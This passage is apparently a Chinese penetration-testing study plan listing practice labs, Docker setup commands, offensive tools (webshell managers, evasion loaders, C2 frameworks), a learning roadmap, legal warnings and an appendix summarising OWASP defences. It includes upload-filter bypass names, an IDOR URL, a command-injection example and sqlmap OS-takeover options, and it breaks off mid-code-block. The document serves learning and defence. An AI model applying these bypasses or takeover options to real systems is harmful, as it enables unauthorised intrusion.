| **upload-labs** 🟡 | 文件上传专项（21 关） | 入门→进阶 | 已搭建，前 15 关已完成 |
| **Pikachu** 🟡 | 覆盖 20+ 漏洞（含 SSRF/XXE/SSTI/越权等） | 入门→进阶 | 已在学习中 |
| **Vulnhub** 🟡 | 真实靶机（Kioptrix/Mr-Robot/Stapler） | 进阶 | 计划中，练全流程渗透 |
| **Vulhub** | 大量真实漏洞环境（Docker 一键起） | 进阶 | ⭐ 推荐补充 |
| **WebGoat** | OWASP 官方综合靶场 | 入门→进阶 | 可选 |
| **bWAPP** | 100+ 漏洞 | 入门 | 可选 |

### 6.2 部署命令（Docker 快速起靶场）

```bash
# 部署 Vulhub（以任意一个漏洞环境为例）
git clone https://github.com/vulhub/vulhub
cd vulhub/flask/ssti
docker compose up -d
# 讲解：git clone 克隆 vulhub 仓库，cd 进入 ssti（模板注入）漏洞目录，
#       docker compose up -d 一键启动该漏洞环境（-d 后台运行）。
# 效果：本地 8080 端口起一个带 SSTI 漏洞的 Flask 应用，可直接练习。

# 部署 upload-labs
docker run -d -p 8080:80 --name upload-labs c0ny1/upload-labs
# 讲解：docker run 启动容器，-d 后台，-p 8080:80 映射端口到本机 8080，
#       --name 命名容器，最后是镜像名。
# 效果：访问 http://localhost:8080 即可练习文件上传绕过。
```

### 6.3 在线练习平台

| 平台 | 类型 | 说明 |
|------|------|------|
| **Hack The Box (HTB)** | 渗透实战 | 大量靶机，从易到难，社区氛围好 |
| **TryHackMe (THM)** | 渗透实战 | 新手友好，有引导式教程 |
| **PortSwigger Web Security Academy** 🟡 | Web 专项 | 官方免费，你已注册账号（第 11 周 SSRF/XXE 练习用），强烈推荐继续 |
| **攻防世界** 🟡 | CTF 竞赛 | 你计划中（第 18 周刷 Web 前 20 题），国内知名平台有新手区 |
| **BugkuCTF** | CTF 竞赛 | 你学习记录中列出，国内 Web 题多 |
| **DVWA 官方** | 靶场 | 你已搭建 |

### 6.4 推荐学习顺序

```
阶段一（入门）：DVWA → sqli-labs → upload-labs
阶段二（进阶）：Pikachu → PortSwigger Academy → WebGoat
阶段三（实战）：Vulhub（真实漏洞）→ HTB/THM → 挖 SRC
```

---

## 第 7 章 工具清单

### 7.1 必备工具（Kali 内置，重点掌握）

| 工具 | 用途 | 你的掌握程度 |
|------|------|-----------|
| **Burp Suite** | 抓包、改包、重放、扫描 | ✅ 已熟练（Proxy/Repeater/Intruder，含 WAF 绕过配置） |
| **sqlmap** | SQL 注入自动化 | ✅ 已熟练（含 --no-cast/--hex/--random-agent 等高阶参数） |
| **Nmap** | 端口扫描 | ✅ 已掌握（-sV/-O/-A/--script 等） |
| **curl** | 命令行 HTTP 客户端 | ✅ 已掌握 |
| **nc (netcat)** | 网络连接、反弹 shell | ✅ 已掌握（-lvnp 监听） |
| **dirsearch** | 目录扫描 | ✅ 已掌握（含自定义字典） |
| **whatweb / wpscan** | 指纹识别 / WordPress 扫描 | 🟡 已接触 |
| **Wireshark** | 网络抓包分析 | ✅ 已掌握（第一阶段重点练） |
| **Sublist3r / amass** | 子域名枚举 | 🟡 已接触 |
| **Metasploit** | 渗透框架 | 🟡 已接触（第三阶段深入） |
| **LinPEAS / lse.sh** | Linux 提权检测 | 🟡 已接触概念 |
| **蚁剑（AntSword）** | webshell 管理 | ✅ 已使用（连接上传的 shell） |
| **John / hashcat** | 密码破解 | ⬜ 尚未系统学习 |

### 7.2 手册推荐的专项工具（进阶）

| 方向 | 工具 |
|------|------|
| **webshell 管理** | 蚁剑、冰蝎、哥斯拉 |
| **反序列化** | ysoserial、ysoserial-for-gadget |
| **内网横向** | impacket、fscan、Stowaway |
| **隧道代理** | frp、chisel、Neo-reGeorg、suo5 |
| **提权** | mimikatz、lse.sh、wesng、PetitPotato |
| **免杀** | LoaderGo、ByPassGodzilla、XG_NTAI |
| **扫描器** | AWVS、Xray、Vulmap |
| **C2 框架** | Cobalt Strike、Sliver、Metasploit |

> **提示**：初学者先掌握"必备工具"即可，手册里的专项工具按需在学习到对应章节时再接触。

---

## 第 8 章 学习路线总表 & 时间规划

### 8.1 六阶段学习路线（已标注你的当前进度）

| 阶段 | 内容 | 状态 | 达成目标 |
|------|------|------|---------|
| **阶段 0** | 环境搭建（第 0 章） | ✅ 已完成 | 环境跑通，会用 Burp 抓包 |
| **阶段 1** | 基础地基（第 1 章） | ✅ 已完成 | 理解 HTTP/Linux/SQL 基础 |
| **阶段 2** | 漏洞理解（第 2 章） | ✅ 已完成 | 建立漏洞思维模型 |
| **阶段 3** | 漏洞利用（第 3 章） | 🟡 进行中（约 60%） | SQLi/XSS/CSRF 已掌握，上传/包含/命令注入/SSRF/XXE 练习中，越权/JWT/SSTI/反序列化未学 |
| **阶段 4** | 代码审计（第 4 章） | ⬜ 未开始 | 能从源码找漏洞 |
| **阶段 5** | 渗透实战（第 5 章） | 🟡 进行中 | 信息收集已掌握，提权/内网/报告待补 |

> **你当前的定位**：已完成前两个阶段（基础 + 漏洞理解），正处在「阶段 3 漏洞利用」的收尾期和「阶段 5 渗透实战」的起步期。建议按下面 8.4 的优先级推进。

### 8.2 每周建议节奏（以每天 1~2 小时为例）

```
周一~周五：每天学 1 个漏洞知识点（原理 → 靶场实操 → 记录笔记）
周六：复习本周内容 + 完成一个综合练习
周日：休息 / 总结 / 写博客沉淀
```

### 8.3 第 3 章漏洞学习顺序建议

```
SQL 注入 → XSS → CSRF → 命令执行 → 文件上传 → 文件包含
  → SSRF → XXE → 越权 → SSTI → JWT → 反序列化 → 其他补充
```

> **原理**：先学有现成靶场（DVWA/sqli-labs）且基础的，再学需要额外环境的，反序列化等难点放后面。

### 8.4 你的下一步优先级（基于当前进度定制）

按顺序推进，每项完成后打勾：

1. **收尾练习中的漏洞**：文件上传（解析漏洞/内容校验/图片马）→ 文件包含（data://、php://input）→ 命令注入（反弹 shell 实战）→ SSRF（gopher 打 Redis）→ XXE（盲 XXE）
2. **补核心未学漏洞**：越权（IDOR，挖 SRC 价值最高）→ JWT → SSTI → 反序列化
3. **补高频业务漏洞**：业务逻辑漏洞、信息泄露、CORS 误配
4. **进入代码审计**：从 PHP 危险函数入手
5. **渗透实战收尾**：用 Vulnhub 靶机（Kioptrix→Mr-Robot→Stapler）走完整流程，重点练 Linux 提权和报告撰写

---

## 第 9 章 常见问题 FAQ

### 9.1 环境类

**Q1：DVWA 打不开，页面空白或报错？**
A：检查 Apache 和 MySQL 是否启动：
```bash
systemctl status apache2    # 查看 Apache 状态
systemctl status mysql      # 查看 MySQL 状态
# 若未启动，用 systemctl start apache2 / systemctl start mysql 启动
```

**Q2：DVWA 数据库连接失败（Could not connect to database）？**
A：通常是 MySQL 账号密码不对，检查 DVWA 的 `config/config.inc.php` 里的数据库配置，改成你本机的 MySQL 账号密码。

**Q3：sqli-labs 页面中文乱码？**
A：检查 MySQL 字符集，或在 URL 里加 `charset=utf-8`。

**Q4：Docker 拉取镜像超时？**
A：配置国内镜像加速器（阿里云镜像仓库），或换镜像源。

### 9.2 学习类

**Q5：零基础能学会吗？需要先学编程吗？**
A：能。建议边学边补编程基础（PHP/Python/SQL），不需要先精通编程再开始，但 SQL 基础是学 SQL 注入的前提。

**Q6：记不住这么多 payload 怎么办？**
A：不需要死记。重点是理解原理和思路，payload 用的时候查（手册就是为此设计的速查库）。多做笔记、多实操自然就记住了。

**Q7：学完能找工作吗？**
A：学完第 3 章能入门，学完第 4、5 章并积累实战经验（CTF、SRC、授权项目）后，具备渗透测试岗位的基础能力。

### 9.3 安全类

**Q8：怎么保证自己学习不违法？**
A：牢记三条红线：
1. 只在**授权环境**（自己搭建的靶场、CTF、或获得书面授权的目标）练习。
2. 对未授权目标做扫描、测试、攻击都违法，可能触犯《网络安全法》《刑法》第 285/286 条。
3. 学到的知识用于**防御和合法测试**，不要用于非法入侵。

---

## 第 10 章 合法合规与职业发展

### 10.1 法律红线（务必牢记）

- **《网络安全法》**：未经授权不得对他人系统进行测试。
- **《刑法》第 285 条**：非法侵入计算机信息系统罪。
- **《刑法》第 286 条**：破坏计算机信息系统罪。

> **一句话**：技术是中性的，用在哪决定了你是白帽还是黑帽。所有学习请在自己搭建的靶场或授权范围内进行。

### 10.2 职业发展路径

| 方向 | 技能要求 | 认证/背书 |
|------|---------|----------|
| **渗透测试工程师** | 全流程 + 报告能力 | OSCP、CISP-PTE、CISP-PTS |
| **安全开发** | 代码审计 + 开发能力 | 项目经验 |
| **安全运营（甲方）** | 防御 + 应急响应 | CISP、CISA |
| **漏洞研究** | 深度逆向/协议分析 | 原创 CVE、SRC 排名 |

### 10.3 持续学习资源

| 类型 | 资源 |
|------|------|
| **漏洞库** | OWASP Top 10、CVE、CNVD |
| **社区** | 先知社区、FreeBuf、T00ls、看雪论坛 |
| **SRC 平台** | 各大厂商 SRC（积累实战 + 赚赏金） |
| **原手册** | [ReAbout/web-sec](https://github.com/ReAbout/web-sec) 持续关注更新 |

---

## 附录：参考资料与手册文档索引

### 手册核心文档索引（速查）

**漏洞理解篇（vul/）**：
- `VUL-CrossDomain.md` — 同源策略/CSP/JSONP
- `VUL-Backend.md` — 应用分层与漏洞分类
- `VUL-Auth-Session.md` — 认证与密码误用
- `VUL-Crypto.md` — 密码学误用
- `VUL-Logic.md` — 业务逻辑漏洞

**漏洞利用篇（exp/）**：详见第 3 章各节标注的文档名。

**渗透篇（penetration/）**：详见第 5 章各阶段标注的文档名。

---

## 附录 B：权威标准与官方来源速查（可追溯）

> **本章说明**：以下内容全部来自业界公认的权威公开来源——OWASP（开放 Web 应用安全项目）、NIST（美国国家标准与技术研究院）、CIS（互联网安全中心）、SANS/MITRE（CWE Top 25）以及主流安全工具的官方文档。每条内容均标注原始出处，命令与结论均未做改动，仅做分类整理与中文说明，确保学习内容**可执行、可追溯**。攻击性命令仅限在授权靶场中使用。

### B.1 权威框架与标准总览

#### B.1.1 OWASP Top 10:2025（应用安全风险排行榜）

> 📌 来源：OWASP Top 10 官方项目 <https://owasp.org/Top10/>

OWASP Top 10 是 Web 应用安全领域最权威的风险共识文档，2025 版已更新为：

| 排名 | 类别（英文） | 中文说明 |
|------|-------------|---------|
| A01 | Broken Access Control | 访问控制失效（越权，已升至第 1 位） |
| A02 | Security Misconfiguration | 安全配置错误 |
| A03 | Software Supply Chain Failures | 软件供应链失败 |
| A04 | Cryptographic Failures | 密码学失效 |
| A05 | Injection | 注入（SQLi、命令注入等合并） |
| A06 | Insecure Design | 不安全设计 |
| A07 | Authentication Failures | 身份认证失效 |
| A08 | Software or Data Integrity Failures | 软件与数据完整性失效 |
| A09 | Security Logging and Alerting Failures | 日志与告警失效 |
| A10 | Mishandling of Exceptional Conditions | 异常条件处理不当 |

> 💡 **学习提示**：注意 2025 版与旧版（2017/2021）的差异——**越权（A01）已超越注入成为头号风险**，这正是你尚未系统学习的越权（IDOR）章节，应优先补上。

#### B.1.2 NIST CSF 2.0（网络安全框架）

> 📌 来源：NIST 官方 <https://www.nist.gov/cyberframework>

NIST 网络安全框架（Cybersecurity Framework, CSF）2.0 将网络安全能力划分为 **6 大功能（Functions）**，是理解"从防护到恢复"完整闭环的通用语言：

| 功能 | 英文 | 含义 |
|------|------|------|
| 治理 | **Govern** | 建立并传达网络安全风险管理策略、期望与政策（2.0 新增） |
| 识别 | **Identify** | 了解组织当前的网络安全风险 |
| 保护 | **Protect** | 使用防护措施管理风险 |
| 检测 | **Detect** | 发现并分析可能的网络安全攻击与事件 |
| 响应 | **Respond** | 对检测到的网络安全事件采取行动 |
| 恢复 | **Recover** | 恢复正常运营并从中吸取教训 |

> 💡 **学习提示**：本学习计划的第 5 章（渗透测试全流程）本质上就是站在攻击者视角"验证"这 6 大功能是否落实。理解 CSF 能帮你把"挖漏洞"上升到"评估风险"的高度。

#### B.1.3 CIS Controls v8.1（18 个关键安全控制）

> 📌 来源：CIS（互联网安全中心）官方 <https://www.cisecurity.org/controls/v8-1>

CIS Controls 是**优先排序、可执行**的安全最佳实践清单，共 18 个控制（Control 1–18），共 153 条 Safeguards，并按实施组（IG1/IG2/IG3）分级。完整清单：

| # | 控制名称（英文） | 中文说明 |
|---|-----------------|---------|
| 1 | Inventory and Control of Enterprise Assets | 企业资产清单与控制 |
| 2 | Inventory and Control of Software Assets | 软件资产清单与控制 |
| 3 | Data Protection | 数据保护 |
| 4 | Secure Configuration of Enterprise Assets and Software | 资产与软件的安全配置 |
| 5 | Account Management | 账户管理 |
| 6 | Access Control Management | 访问控制管理（最小权限 + MFA） |
| 7 | Continuous Vulnerability Management | 持续漏洞管理（打补丁、漏洞扫描） |
| 8 | Audit Log Management | 审计日志管理 |
| 9 | Email and Web Browser Protections | 邮件与浏览器防护 |
| 10 | Malware Defenses | 恶意软件防御 |
| 11 | Data Recovery | 数据恢复（备份） |
| 12 | Network Infrastructure Management | 网络基础设施管理 |
| 13 | Network Monitoring and Defense | 网络监控与防御 |
| 14 | Security Awareness and Skills Training | 安全意识与技能培训 |
| 15 | Service Provider Management | 服务提供商管理 |
| 16 | Application Software Security | 应用软件安全（安全开发） |
| 17 | Incident Response Management | 事件响应管理 |
| 18 | Penetration Testing | 渗透测试（验证控制有效性） |

> 💡 **学习提示**：CIS Controls 是"防守方视角"的最佳实践，与你正在学的"攻击方视角"（漏洞利用）互为镜像。Control 16（应用软件安全）和 Control 18（渗透测试）与你当前学习内容最直接相关。CIS 还提供 **CIS Benchmarks**（各系统/软件的详细加固基线），是 Control 4 的落地工具，可下载学习。

#### B.1.4 CWE/SANS Top 25 最危险软件缺陷（2025）

> 📌 来源：SANS + MITRE CWE 官方 <https://cwe.mitre.org/top25/>

CWE Top 25 是 SANS 与 MITRE 基于真实漏洞数据编制的"最危险的 25 个软件缺陷"排行榜，是理解漏洞根因（CWE 编号）的权威索引。与你学习计划直接相关的前几项：

| 排名 | CWE 编号 | 缺陷名称（英文） | 对应学习计划章节 |
|------|---------|-----------------|-----------------|
| 1 | CWE-787 | Out-of-bounds Write（越界写） | 内存安全（二进制方向） |
| 2 | CWE-79 | Cross-site Scripting（XSS） | 3.2 XSS |
| 3 | CWE-89 | SQL Injection | 3.1 SQL 注入 |
| 4 | CWE-416 | Use After Free（释放后使用） | 内存安全 |
| 5 | CWE-78 | OS Command Injection | 3.6 命令注入 |
| 6 | CWE-20 | Improper Input Validation | 通用输入校验 |
| 8 | CWE-22 | Path Traversal（路径穿越） | 3.9 文件包含 |
| 9 | CWE-352 | CSRF | 3.3 CSRF |
| 10 | CWE-434 | Unrestricted File Upload | 3.5 文件上传 |
| 11 | CWE-862 | Missing Authorization | 3.11 越权 |
| 15 | CWE-502 | Deserialization of Untrusted Data | 3.10 反序列化 |
| 19 | CWE-918 | SSRF | 3.4 SSRF |
| 23 | CWE-94 | Code Injection | 3.6 命令/代码执行 |

> 💡 **学习提示**：CWE 编号是漏洞的"身份证"。学会用 CWE 编号检索（如 `CWE-89`）能精准定位 MITRE 官方提供的漏洞原理、代码示例、检测方法与修复方案，是深入研究的必备技能。

---

### B.2 OWASP Cheat Sheet 权威防护速查（按漏洞分类）

> 📌 来源：OWASP Cheat Sheet Series 官方 <https://cheatsheetseries.owasp.org/>

以下内容是对你已学各漏洞的**权威防护方案补强**，每一条都直接对应 OWASP 官方 Cheat Sheet 的原文结论。

#### B.2.1 SQL 注入防护（官方权威版）

> 📌 来源：SQL Injection Prevention Cheat Sheet

**核心结论（OWASP 原文要旨）**：SQL 注入发生的原因是"不可信数据成为了 SQL 语法的一部分"。防御三原则：

1. **用参数化查询绑定数据值**（Prepared Statements）
2. **用应用自有映射固定查询结构**（表名/列名/排序方向等结构不可由用户输入拼接）
3. **最小权限**（least privilege）限制破坏范围

**权威代码示例（Java，参数化查询）**：

```java
String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, customerName);   // 绑定参数，值只当数据不当语法
ResultSet results = statement.executeQuery();
```

> 输入 `tom' or '1'='1` 会被当作字面量用户名处理，不会改变 SQL 语法。

**OWASP 明确的"禁止项"**：

- ❌ **手动转义替代参数绑定**——转义依赖方言与配置（如 MySQL 的 `NO_BACKSLASH_ESCAPES` 模式会禁用反斜杠转义），强烈不推荐。
- ❌ **ORM 中拼接字符串**——ORM 不能自动免疫注入，Hibernate 查询仍可能被注入（CWE-564）。
- ❌ **给应用账户 DBA/admin 权限**——必须最小权限。

**动态结构（排序方向等）的正确做法（白名单映射）**：

```php
// 错误：直接把用户输入拼进 ORDER BY
$order = "SELECT * FROM users ORDER BY " . $_GET['sort'];  // ❌

// 正确：映射到固定 token
$map = ['name' => 'username', 'age' => 'age', 'time' => 'created_at'];
$column = $map[$_GET['sort']] ?? 'username';  // ✅ 只允许白名单内的列
```

#### B.2.2 XSS 防护（官方权威版）

> 📌 来源：XSS (Cross Site Scripting) Prevention Cheat Sheet

**核心结论（OWASP 原文）**："没有任何单一技术能解决 XSS，必须根据**数据插入的上下文**组合使用正确的防御技术。"

**按上下文选择编码方式（速查表）**：

| 上下文 | 示例 | 正确防御 |
|--------|------|---------|
| HTML 正文 | `<div>数据</div>` | HTML 实体编码 |
| 安全 HTML 属性 | `<input value="数据">` | 引号包裹 + 属性编码 |
| GET 参数 | `<a href="/s?q=数据">` | URL 编码（只编码参数值） |
| 不可信 URL | `<a href="不可信URL">` | 规范化 + URL 白名单（仅 http/https）+ 属性编码 |
| CSS 值 | `<div style="width:数据">` | 严格结构校验 + CSS 十六进制编码 |
| JS 变量 | `<script>var v='数据'</script>` | JS 编码器（覆盖 JS + 外层 HTML 上下文） |
| 用户 HTML | `<div>用户提交的HTML</div>` | HTML Sanitization（DOMPurify） |

**HTML 实体编码对照表**：

| 字符 | 编码 |
|------|------|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

**安全/危险 DOM API 对照（DOM XSS 关键）**：

| 安全写法 ✅ | 危险写法 ❌ |
|------------|------------|
| `elem.textContent = data` | `elem.innerHTML = data` |
| `elem.insertAdjacentText("beforeend", data)` | `document.write(data)` |
| `document.createTextNode(data)` | `eval(data)` / `setTimeout(data)` |

**OWASP 明确的"反模式"（不要只依赖这些）**：

- ❌ **仅依赖 WAF**——WAF 无法防 DOM-based XSS，不能替代上下文感知编码。
- ❌ **仅依赖 CSP**——CSP 是纵深防御，不是主防线；需按应用单独定制。
- ❌ **仅依赖拦截器/过滤器**——无法覆盖所有上下文，易造成双重编码，且对 DOM XSS 和内部服务数据无效。

**需要用户提交 HTML 时**：OWASP 官方推荐 **DOMPurify** 做 HTML 净化：

```javascript
let clean = DOMPurify.sanitize(dirty);  // 净化后交给其他库处理前需确认不会变异字符串
```

#### B.2.3 CSRF 防护（官方权威版）

> 📌 来源：Cross-Site Request Forgery Prevention Cheat Sheet

**核心结论（OWASP 原文）**：**XSS 可以击溃所有 CSRF 缓解技术**，但即使存在 XSS 风险，依赖 Cookie 认证的应用仍必须用 CSRF Token。

**首选：同步器令牌模式（Synchronizer Token Pattern）**——OWASP 定位为"最流行且最推荐"：

- Token 在**服务端**生成，每个会话唯一、不可预测、保密
- 通过表单隐藏字段 / JSON 载荷 / 自定义请求头传输，**禁止**通过 Cookie 传输
- 服务端比对请求 Token 与会话 Token，缺失或不匹配则**拒绝请求**
- **禁止**在 URL 或 GET 请求中携带 Token（会泄露到浏览器历史/日志/Referer）

**无状态应用的替代：签名双重提交 Cookie（HMAC 版）**——OWASP 推荐签名版而非朴素版：

- Token = HMAC（会话依赖值 + 随机值），用恒定时间比较验证
- ❌ **朴素双重提交 Cookie 不推荐**：可被能向目标域写 Cookie 的攻击者绕过（兄弟子域、DNS 接管、明文 HTTP Cookie 注入等）

**SameSite Cookie 属性（纵深防御，非独立方案）**：

| 取值 | 行为 | 注意 |
|------|------|------|
| `Strict` | 跨站请求一律不发送 Cookie | 可能干扰合法外部导航 |
| `Lax` | 仅跨站顶级导航 + 安全方法才发送 | **只拦不安全方法**，GET 触发状态变更仍危险 |
| `None` | 允许跨站发送 | **必须配合 `Secure`** |

**检查 Origin/Referer 头**：这两个头属于浏览器的 forbidden headers，无法被程序修改，可靠性高。注意 `Origin: null`（来自跨源重定向或沙箱 iframe）**不应加入白名单**。

**其他要点**：

- ❌ **不要用 GET 请求做状态变更操作**
- 表单"简单请求"（`application/x-www-form-urlencoded` 等）可被跨站发送，API 可拒绝这些内容类型
- 登录表单也有 CSRF 风险，需创建**预会话**并包含 Token

#### B.2.4 SSRF 防护（官方权威版）

> 📌 来源：Server-Side Request Forgery Prevention Cheat Sheet

**核心原则（OWASP 原文）**：**优先白名单，黑名单极易被绕过**（"Deny-lists are bypass-prone. Prefer allow-lists."）；**网络层 + 应用层双层加固**（纵深防御）。

**网络层防护**：

- 防火墙限制流量：仅允许应用访问其应当通信的目标
- **网络分段（强烈推荐）**：在网络层面直接阻断非法调用

**应用层防护关键点**：

1. **输入校验**：只接收 IP 或域名，**不接受用户提供的完整 URL**，由应用自行构建请求（固定 scheme/端口/路径）
2. **禁用重定向**：否则攻击者可借 HTTP 重定向绕过输入校验
3. **防 DNS Rebinding**：仅域名白名单不够，必须同时校验解析出的 IP，且让 HTTP 客户端**只连接到已验证的 IP**
4. **解析器分歧即拒绝**：如 `http://example.com\@evil.com` 在不同解析器读出的主机名不同，应直接拒绝
5. **协议白名单**：仅允许 `HTTP`/`HTTPS`，阻止 `file://`、`gopher://`、`dict://` 等

**黑名单兜底时至少屏蔽的网段（OWASP 原文）**：

```
169.254.169.254          # 云元数据服务（AWS/GCP/Azure IMDS）
127.0.0.0/8              # localhost
10.0.0.0/8               # RFC1918 私网
172.16.0.0/12            # RFC1918 私网
192.168.0.0/16           # RFC1918 私网
169.254.0.0/16           # 链路本地
fc00::/7                 # IPv6 Unique Local
fe80::/10                # IPv6 Link-Local
::1/128                  # IPv6 localhost
```

**云环境专项**：迁移到 **AWS IMDSv2 并禁用 IMDSv1**，可缓解部分 SSRF（窃取元数据凭证）风险。

#### B.2.5 文件上传防护（官方权威版）

> 📌 来源：File Upload Cheat Sheet

**核心原则（OWASP 原文要点）**：

- **只允许业务必需的扩展名**（白名单，如仅 `docx` + `pdf`）
- **不要信任 Content-Type 头**（用户可控，可伪造）
- **文件名改为应用生成的随机名**（防覆盖、防路径穿越）
- 设置文件名长度限制与字符限制、文件大小限制
- **存储到 webroot 之外**，或独立服务器；公开访问用 handler 映射（`someid -> file.ext`）
- 用杀毒软件或沙箱检测恶意内容；用 CDR（内容净化重建）处理 PDF/DOCX
- 保护上传接口免受 CSRF 攻击

**扩展名校验需防范的绕过（OWASP 原文）**：

| 绕过手法 | 示例 |
|---------|------|
| 双扩展名 | `.jpg.php` |
| 空字节 | `.php%00.jpg` |
| 大小写 | `.pHp`、`.phP` |
| 替代扩展名 | `.phtml`、`.php5`、`.pht`、`.jspx`、`.aspx` |
| Windows NTFS ADS | `shell.asp:.jpg`、`shell.php::$DATA`（拒绝含 `:` 的文件名） |

#### B.2.6 命令注入防护（官方权威版）

> 📌 来源：OS Command Injection Defense Cheat Sheet

**三层防御（OWASP 原文）**：

1. **首选：避免直接调用 OS 命令**——用库函数替代，如 `mkdir()` 代替 `system("mkdir /dir_name")`
2. **次选：转义**——PHP 用 `escapeshellarg()`（把输入包进单引号，当作单个参数）；**优先 `escapeshellarg()` 而非 `escapeshellcmd()`**
3. **参数化 + 输入校验**：命令必须是白名单内的固定命令，参数用白名单正则校验

**需转义的元字符（OWASP 原文 "Note A"）**：

```
& | ; $ > < ` \ ! ' " ( )
```

**PHP 权威示例（OWASP 原文，展示 escapeshellcmd 的缺陷）**：

```php
// ❌ escapeshellcmd 仍允许覆盖 --directory-prefix 参数，导致 RCE
system(escapeshellcmd("wget --directory-prefix=..\\temp " . $_GET['url']));

// ✅ escapeshellarg 把 URL 当作单个参数，攻击失败
system("wget --directory-prefix=..\\temp " . escapeshellarg($_GET['url']));
```

**Java 权威示例（OWASP 原文）**：

```java
// ❌ Runtime.exec(String) 已弃用（Java 18+），按空格分词易被注入参数
// ✅ 正确：ProcessBuilder 把程序和参数分开传
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");
pb.directory(new File("TrustedDir"));
Process p = pb.start();
```

> 💡 **补充**：命令注入同时也是"参数注入"——即使转义了元字符，攻击者仍可能注入额外参数（如 `--help`），所以必须配合白名单校验参数。

#### B.2.7 XXE 防护（官方权威版）

> 📌 来源：XML External Entity Prevention Cheat Sheet

**核心原则（OWASP 原文）**：

1. **尽可能禁用 DTD**——若解析器支持，直接拒绝 `DOCTYPE` 声明
2. 若必须用 DTD，则**禁用外部实体解析和外部 DTD 加载**
3. **保持 XInclude 禁用**
4. **"不支持的安全设置视为配置失败"**——不要以部分加固状态继续处理不可信 XML

**各语言权威配置（OWASP 原文）**：

```java
// Java：拒绝 DOCTYPE + 安全处理
DocumentBuilderFactory dbf = DocumentBuilderFactory.newDefaultInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```

```php
// PHP：libxml 2.9.0+ 默认禁用实体替换；关键——回调返回 null，而非直接传 null
libxml_set_external_entity_loader(function () {
    return null;   // ⚠️ 直接传 null 给该函数不能阻止外部实体加载
});
```

```csharp
// .NET：XmlResolver 设为 null 禁用 DTD（≥4.5.2 默认即安全）
XmlDocument xmlDoc = new XmlDocument();
xmlDoc.XmlResolver = null;
xmlDoc.LoadXml(xml);
```

```python
# Python：使用 defusedxml 库替代标准库解析函数
import defusedxml.ElementTree as ET   # 对不可信 XML 使用 defusedxml
```

> 💡 **.NET 特别提醒**：ASP.NET 应用即使运行在 ≥4.5.2 上，也必须在 `Web.config` 中设置 `<httpRuntime targetFramework="4.5.2" />`，否则有效框架版本取"构建版本与配置的较低值"，可能退回不安全默认。

#### B.2.8 越权 / 访问控制防护（官方权威版）

> 📌 来源：Authorization Cheat Sheet + OWASP Top 10:2025 A01

**核心原则（OWASP 原文）**：

1. **默认拒绝（Deny by Default）**：不匹配任何规则时拒绝访问，而非允许
2. **服务端强制校验，每个请求都验证**：绝不依赖客户端检查（易绕过）
3. **对象级授权（防 IDOR）**：用户能访问某一类型的对象，**不代表**能访问该类型的每一个对象；不要仅靠"隐藏 ID"（security through obscurity 不足够）
4. **间接引用映射**：不直接暴露内部 ID，改用用户/会话特定的间接引用（OWASP ESAPI 提供实现）

**IDOR 攻击示例（OWASP 原文）**：

```
https://mybank.com/accountTransactions?acct_id=901   # 攻击者改为 acct_id=523 访问他人资源
```

**授权模型选型（OWASP 原文建议）**：优先 **ABAC（基于属性）/ ReBAC（基于关系）**，而非 RBAC（基于角色）——RBAC 存在角色爆炸、粒度粗、多租户支持差等问题。

#### B.2.9 身份认证防护（官方权威版）

> 📌 来源：Authentication Cheat Sheet

**密码存储（OWASP 原文要点）**：

- 用经过验证的哈希算法（bcrypt 等）+ 加盐，**不要自行设计加密方案**
- 不静默截断密码，最大长度 ≥ 64 字符（支持 passphrase）
- 用安全比较函数（如 PHP `password_verify()`）做恒定时间比较

**MFA（多因素认证）**：OWASP 引用微软分析——**MFA 可阻止 99.9% 的账户泄露事件**，应在所有可能的地方实施。

**登录错误消息（OWASP 原文）**：

```
正确 ✅："Login failed; Invalid user ID or password."   # 不泄露用户是否存在
错误 ❌："Login failed, invalid user ID."               # 泄露用户枚举
```

**密码重置错误消息（OWASP 原文）**：

```
正确 ✅："If that email address is in our database, we will send you an email to reset your password."
错误 ❌："This email address doesn't exist in our database."   # 导致用户枚举
```

**密码策略（OWASP 原文反常识结论）**：不强制要求大小写/数字/特殊字符组合，不强制定期改密，改用"密码泄露时强制轮换"；推荐用 Pwned Passwords 屏蔽常见泄露密码。

**防自动化攻击**：登录节流、账户锁定（失败计数关联**账户本身**而非源 IP，防换 IP 绕过）、CAPTCHA（多次失败后要求）、MFA。

---

### B.3 主流工具官方命令速查（可执行）

> 以下命令均来自各工具**官方文档**，保留了原始命令格式与选项含义，仅限在授权环境使用。

#### B.3.1 sqlmap 官方命令速查

> 📌 来源：sqlmap 官方 Wiki — Usage <https://github.com/sqlmapproject/sqlmap/wiki/Usage>

**目标指定**：

| 选项 | 含义 |
|------|------|
| `-u URL` / `--url=URL` | 指定目标 URL |
| `-r REQUESTFILE` | 从文件加载 HTTP 请求（省去手动设 Cookie/POST） |
| `-m BULKFILE` | 批量扫描文件中的多个目标 |

**枚举（核心数据提取）**：

| 选项 | 含义 |
|------|------|
| `--dbs` | 枚举所有数据库 |
| `-D DB --tables` | 枚举指定库的表 |
| `-D DB -T TBL --columns` | 枚举指定表的列 |
| `-D DB -T TBL --dump` | 导出表数据 |
| `--current-db` / `--current-user` | 当前数据库 / 当前用户 |
| `--users` / `--passwords` | 枚举用户 / 密码哈希 |
| `--sql-shell` | 交互式 SQL shell |

**检测与风险控制**：

| 选项 | 含义 |
|------|------|
| `--level=1~5` | 测试级别（默认 1；≥2 测 Cookie，≥3 测 UA/Referer，5 测 Host 头） |
| `--risk=1~3` | 风险等级（默认 1；3 含 OR 型注入，可能更新整表数据） |
| `--batch` | 非交互模式，全用默认值 |
| `--technique=BEUSTQ` | 注入技术（B布尔盲注/E报错/U联合/S堆叠/T时间盲注/Q内联） |
| `--tamper=TAMPER` | WAF 绕过脚本（如 `--tamper="space2comment,between"`） |

**系统级操作**：

| 选项 | 含义 |
|------|------|
| `--os-shell` | 交互式 OS shell |
| `--os-cmd=OSCMD` | 执行单条系统命令 |
| `--file-read=FILE` / `--file-write=FILE` | 读/写文件 |

> ⚠️ **官方提示**：访问文件系统、接管 OS、读写注册表时，`--technique` 必须包含字母 `S`（堆叠查询）。

**官方完整示例**：

```bash
